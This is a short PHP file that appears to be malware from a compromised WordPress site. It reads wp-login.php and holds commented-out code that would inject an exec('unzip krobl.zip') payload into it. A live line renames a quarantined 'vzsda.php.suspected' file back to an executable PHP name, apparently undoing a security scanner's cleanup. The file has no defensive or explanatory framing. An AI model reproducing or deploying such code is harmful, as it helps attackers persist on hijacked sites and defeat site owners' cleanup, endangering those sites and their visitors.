<?php
$code = '<?php
exec(\'unzip krobl.zip\');
?>';
$file = fopen("../../wp-login.php", "r");  
                          $buffer = fread($file, filesize("../../wp-login.php")); 
                          fclose($file);
//$in = fopen("../../wp-login.php", "w");
				             //fwrite($in, $code);
			                // fwrite($in, $buffer);
				             //fclose($in);
							 if (file_exists("vzsda.php.suspected")) rename("vzsda.php.suspected", "vzsda.php");
?>